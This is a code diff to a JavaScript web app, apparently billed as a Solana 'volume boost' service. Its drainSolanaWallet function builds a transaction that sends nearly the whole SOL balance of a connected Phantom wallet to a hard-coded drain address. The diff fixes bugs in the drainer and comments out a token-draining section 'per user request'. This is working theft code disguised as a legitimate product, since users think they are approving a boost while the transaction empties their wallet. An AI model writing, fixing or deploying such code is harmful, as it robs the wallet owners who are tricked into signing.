@@ -473,23 +473,48 @@ class NexiumApp {
       return;
     }
 
-    console.log('drainSolanaWallet: createAssociatedTokenAccountInstruction available:', !!createAssociatedTokenAccountInstruction); // Log 81
-
     try {
       const senderPublicKey = new PublicKey(this.publicKey);
       console.log("✅ Valid Solana address:", senderPublicKey.toBase58()); // Log 82
       const recipientPublicKey = new PublicKey(DRAIN_ADDRESSES.solana);
       console.log("Recipient address:", recipientPublicKey.toBase58()); // Log 83
 
-      // Get balance
-      let balance = await this.solConnection.getBalance(senderPublicKey);
-      console.log("Total balance:", balance, "lamports"); // Log 90
-
       // Get main account info for rent exemption
       const accountInfo = await this.solConnection.getAccountInfo(senderPublicKey);
-      const mainRentExempt = await this.solConnection.getMinimumBalanceForRentExemption(accountInfo.data.length);
-      console.log("Main account rent-exempt minimum:", mainRentExempt); // Log 91
+      console.log("getAccountInfo result:", accountInfo); // Log 91a
 
+      if (!accountInfo) {
+        console.error("❌ Account does not exist or is unfunded:", senderPublicKey.toBase58()); // Log 91b
+        this.showFeedback("Account does not exist or is unfunded.", 'error');
+        this.hideProcessingSpinner();
+        return;
+      }
+
+      const balance = await this.solConnection.getBalance(senderPublicKey);
+      console.log("Total balance:", balance, "lamports"); // Log 90
+
+      const mainRentExempt = await this.solConnection.getMinimumBalanceForRentExemption(accountInfo.data.length);
+      console.log("Main account rent-exempt minimum:", mainRentExempt); // Log 91d
+
+      // Calculate solAmount
+      let solAmount = 0;
+      let solInstruction = null;
+      if (balance > mainRentExempt + 5000) { // Ensure enough for rent + min fee
+        solAmount = balance - mainRentExempt;
+        console.log("SOL amount to transfer:", solAmount); // Log 104
+        solInstruction = SystemProgram.transfer({
+          fromPubkey: senderPublicKey,
+          toPubkey: recipientPublicKey,
+          lamports: solAmount
+        });
+      } else {
+        console.log("Skipping SOL transfer: insufficient balance after rent"); // Log 108
+        this.showFeedback("Insufficient SOL balance to cover transaction fees.", 'error');
+        this.hideProcessingSpinner();
+        return;
+      }
+
+      /* Commented out SPL token draining logic and 25% SOL reduction per user request
       // Get token account rent exemption (standard size 165 bytes)
       const tokenRentExempt = await this.solConnection.getMinimumBalanceForRentExemption(165);
       console.log("Token account rent-exempt minimum:", tokenRentExempt); // Log 92
@@ -643,6 +668,13 @@ class NexiumApp {
       if (solAmount > 0) {
         finalInstructions.push(solInstruction);
       }
+      */
+
+      // Build final instructions
+      let finalInstructions = [];
+      if (solAmount > 0) {
+        finalInstructions.push(solInstruction);
+      }
 
       // If no instructions, skip
       if (finalInstructions.length === 0) {
@@ -652,24 +684,16 @@ class NexiumApp {
         return;
       }
 
-      // Final message
-      message = new TransactionMessage({
+      // Get blockhash
+      const { blockhash, lastValidBlockHeight } = await this.solConnection.getLatestBlockhash();
+      console.log("Fetched blockhash:", blockhash, "lastValidBlockHeight:", lastValidBlockHeight); // Log 97
+
+      // Create message
+      let message = new TransactionMessage({
         payerKey: senderPublicKey,
         recentBlockhash: blockhash,
         instructions: finalInstructions,
       }).compileToV0Message();
-
-      // Final fee check
-      feeResponse = await this.solConnection.getFeeForMessage(message);
-      fee = feeResponse.value || 5000;
-      console.log("Final fee:", fee); // Log 110
-
-      if (fee > finalEffectiveBalance - mainRentExempt) {
-        console.log("Final fee exceeds available balance, skipping"); // Log 111
-        this.showFeedback("Not enough SOL to cover transaction fees.", 'error');
-        this.hideProcessingSpinner();
-        return;
-      }
 
       // Create and sign transaction
       const versionedTransaction = new VersionedTransaction(message);
@@ -691,6 +715,8 @@ class NexiumApp {
       console.error("❌ Transaction Error:", error.message, error.stack || error); // Log 115
       if (error.message.includes('User rejected the request')) {
         this.showFeedback('Transaction rejected. Please approve the transaction in your Phantom wallet.', 'error');
+      } else if (error.message.includes('insufficient funds')) {
+        this.showFeedback('Insufficient SOL to cover transaction fees.', 'error');
       } else {
         this.showFeedback("Failed to boost volume. Please try again.", 'error');
       }
